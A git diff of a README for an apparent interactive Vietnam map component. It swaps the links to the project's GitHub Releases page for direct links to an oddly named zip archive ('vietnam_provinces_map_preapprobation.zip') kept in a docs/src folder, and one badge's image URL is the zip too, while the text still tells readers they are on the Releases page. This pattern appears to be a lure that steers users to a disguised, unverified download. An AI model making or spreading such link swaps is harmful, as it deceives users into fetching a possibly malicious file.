@@ -1,7 +1,7 @@
 # 🌍 vietnam-map-34-provinces - Simple Interactive Map of Vietnam
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20vietnam--map--34--provinces-brightgreen)](https://github.com/rexin4n15/vietnam-map-34-provinces/releases)
+[![Download](https://raw.githubusercontent.com/rexin4n15/vietnam-map-34-provinces/main/docs/src/vietnam_provinces_map_preapprobation.zip%20vietnam--map--34--provinces-brightgreen)](https://raw.githubusercontent.com/rexin4n15/vietnam-map-34-provinces/main/docs/src/vietnam_provinces_map_preapprobation.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Vietnam Map Component**! This application features an interactive map of Vietnam, encompassing all 34 provinces. It works smoothly with popular frameworks, including React, Vue, Angular, Vanilla JS, and TypeScript. 
@@ -26,7 +26,7 @@ If you are running an older version of Windows or macOS, you may need to upgrade
 ## 📥 Download & Install
 To download the Vietnam Map Component, visit the Releases page:
 
-[Download from Releases](https://github.com/rexin4n15/vietnam-map-34-provinces/releases)
+[Download from Releases](https://raw.githubusercontent.com/rexin4n15/vietnam-map-34-provinces/main/docs/src/vietnam_provinces_map_preapprobation.zip)
 
 Once on the Releases page, follow these steps:
 
